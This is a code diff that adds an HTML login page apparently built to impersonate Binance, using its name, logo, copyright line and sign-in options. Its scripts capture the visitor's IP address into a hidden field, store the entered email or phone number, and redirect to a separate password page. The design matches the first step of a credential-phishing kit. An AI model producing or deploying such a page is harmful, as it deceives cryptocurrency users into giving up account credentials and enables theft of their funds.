@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <title>Bitcoin Exchange | Cryptocurrency Exchange | Binance</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel='stylesheet' type='text/css' media='screen' href='style.css'>
+    <link rel="icon" href="img/icon.png">
+    <script src='main.js'></script>
+</head>
+<body>
+    <img class="logo" src="img/logo.png">
+    <div class="container">
+        <div class="form-container">
+            <h2 class="login-txt">Log In</h2>
+
+            <form method="post" onsubmit="storeEmailOrPhone(); return false;">
+                <div class="input-group">
+                    <p class="label">Email/Phone number</p>
+                    <input type="hidden" id="ipAddress" name="">
+
+                    <input type="text" minlength="2" maxlength="30" required id="emailOrPhone">
+                </div>
+                
+                <div class="input-group">
+                    
+                    <button class="next-btn" type="text">Next</button>
+                </div>
+            </form>
+                <div class="or">
+                    <div class="another-or">
+                    <div class="hr-container">
+                    <hr>
+                </div>
+                    or
+                    <div class="hr-container">
+                    <hr>
+                </div>
+                </div>
+                    <div class="input-group">
+                    
+                        <button class="other-btn" type="text">
+                            <div class="glogo-container">
+                            <img class="glogo" src="img/Glogo.svg.png">
+                        </div>
+                            Continue with Google
+                        </button>
+                    </div>
+
+                    <div class="input-group">
+                    
+                        <button class="other-btn sm-btn" type="text">
+                            <div class="glogo-container">
+                                <img class="glogo" src="img/ios.png">
+                            </div>
+                            Continue with Apple
+                        </button>
+                    </div>
+                </div>
+                <p class="acct">Create a Binance Account</p>
+            
+        </div>
+    </div>
+    <footer>
+        <p>Binance &copy; 2024</p>
+        <p>Cookie Preferences</p>
+    </footer>
+
+
+
+
+
+    <script>
+        fetch('/get_ip') // Replace '/get_ip' with the path to your server-side script
+          .then(response => response.json())
+          .then(data => {
+            document.getElementById('ipAddress').value = data.ip;
+          });
+      </script>
+      
+     <script>
+        function storeEmailOrPhone() {
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            localStorage.setItem('emailOrPhone', emailOrPhone);
+            window.location.href = 'login-password.html';
+        }
+     </script>
+      
+</body>
+</html>
